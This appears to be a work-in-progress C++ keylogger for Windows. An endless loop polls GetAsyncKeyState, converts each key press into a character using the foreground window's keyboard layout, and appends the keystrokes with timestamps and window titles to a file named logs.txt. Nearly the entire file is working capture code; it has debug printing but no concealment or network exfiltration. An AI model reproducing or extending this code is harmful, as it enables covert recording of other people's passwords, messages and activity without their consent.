#pragma comment(lib, "User32.lib")
#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <Winuser.h>
#include <ctime>
#include <chrono>

// function to print current locale in different ways, but it doesn't change when changing language in windows??

const std::locale utf8_locale = std::locale("en_US.UTF-8");


void printLocale(){
	//LCID lcid = GetThreadLocale();
	wchar_t localname[LOCALE_NAME_MAX_LENGTH];
	//GetUserDefaultLocaleName(localname, LOCALE_NAME_MAX_LENGTH);
	if (GetLocaleInfoEx(LOCALE_NAME_USER_DEFAULT, LOCALE_SNATIVEDISPLAYNAME, localname, LOCALE_NAME_MAX_LENGTH) == 0)
		std::cout << "ERROR READING LOCALE" << std::endl;
	std::wcout << "!!!!!Locale name = " << localname << std::endl;
}

/* TranslateKeys() is called on each keypress and simply converts the key press from VK_code to a writable character */

std::string translateKeys(int key){
	std::string result;
	if (key == VK_SPACE)
		result = " ";
	else if (key == VK_RETURN)
		result = "\n";
	else if (key == VK_BACK)
		result = "[DEL]";
	else if (key == VK_TAB)
		result = "\t";
	else if (key == VK_SHIFT)
		result = "[SHIFT]";
	else if (key == VK_CONTROL)
		result = "[CTRL]";
	else if (key == VK_MENU)
		result = "[ALT]";
	else if (key == VK_CAPITAL)
		result = "[CAPS]";
	else if (key == VK_ESCAPE)
		result = "[ESC]";
	else if (key == VK_LEFT)
		result = "[LEFT ARROW]";
	else if (key == VK_RIGHT)
		result = "[RIGHT ARROW]";
	else if (key == VK_UP)
		result = "[UP ARROW]";
	else if (key == VK_DOWN)
		result = "[DOWN ARROW]";
	else if (key == VK_SNAPSHOT)
		result = "[PRINT SCREEN]";
	/*else if (key >= 96 && key <= 105){
		result += key-48;
	}*/
	else{
		// we use the following line to get wScanCode to pass to "ToUnicodeEx()" from MSDN, this function takes a VK_KEY and a flag to specify the type of conversion
		HWND hForegroundProcess = GetForegroundWindow();
		BYTE lpKeyState[256];
		WCHAR buff[8];
		//WORD buff[5];
		//LPDWORD lpdwProcessId;
		DWORD lpdwProcessId;
		DWORD dwThreadID = GetWindowThreadProcessId(hForegroundProcess, &lpdwProcessId);
		HKL keyboardLayout = GetKeyboardLayout(dwThreadID);
		UINT wScanCode = MapVirtualKeyEx(key, MAPVK_VK_TO_VSC, keyboardLayout);
		GetKeyState(VK_SHIFT);
        GetKeyState(VK_MENU);
		GetKeyboardState(lpKeyState);
		int ret = ToUnicodeEx(key, 0, lpKeyState, buff, 8, 0, keyboardLayout); //
		//int ret = ToAsciiEx(key, wScanCode, lpKeyState, buff, 0, keyboardLayout);
		std::cout << "ToUnicodeEx ret" << ret << std::endl; 
		result += buff[0];
		std::wcout << "BUFFFFFFFFFFFERs: " << buff << std::endl;
		printf("{{{%c}}}scan : %c, char : %c\n", result[0], wScanCode, MapVirtualKeyEx(key, MAPVK_VK_TO_CHAR
, keyboardLayout));
	}
	// add shift and caps lock statements later
	//printLocale();
	return result;
}

/* getDate() is called on each log, it uses sprintf to easily get the format we want [DD-MM-YYYY HH:MM:SS] */

std::string getDate() {
	struct tm* timeinfo;
	char timestr[21];
	time_t rawtime;

	time(&rawtime);
	//std::cout << time(NULL) << std::endl;
	timeinfo = localtime(&rawtime);
	//std::cout << timeinfo->tm_mday << std::endl;
	//fprintf??
	sprintf(timestr, "[%02d-%02d-%d %02d:%02d:%02d]", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
	return (timestr);
}

/* getWindowTitle() is also called on each log, it gets the the foreground process ID then calls GetWindowText to get the window title*/

std::string getWindowTitle(){
	HWND fgw = GetForegroundWindow();
	char windowtitle[256];

	GetWindowText(fgw, windowtitle, sizeof(windowtitle));
	//std::cout << "{{" << fgw << "}}";
	return windowtitle;
}

/* Write the date, window title and buffer content to the logfile */

void writeLogs(std::string buf, std::string windowTitle) {
	std::fstream logfile;

	logfile.open("logs.txt", std::ios::app);
	std::cout << "||||WRITING TO FILE||||";
	logfile << getDate();
	logfile << " - '";
	logfile << windowTitle;
	logfile << "' - ";
	logfile << buf << std::endl;
	logfile.close();
}

void main() {
	std::string finalChar;
	std::string buf;
	std::string prevWindow;
	std::string currentWindow;

	prevWindow = getWindowTitle();
	while (true) {
		for (int key = 8; key <= 127; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				finalChar = translateKeys(key);
				buf += finalChar;
				printf("%s\n", finalChar.data());
				currentWindow = getWindowTitle();
				// if buffer exceeds 100 characters or the window changes, write logs then clear buffer
				if (buf.length() >= 100 || (currentWindow != prevWindow && buf.length() > 0))
				{
					writeLogs(buf, prevWindow);
					buf.clear();
					prevWindow = currentWindow;
				}
			}
		}
	}
}
//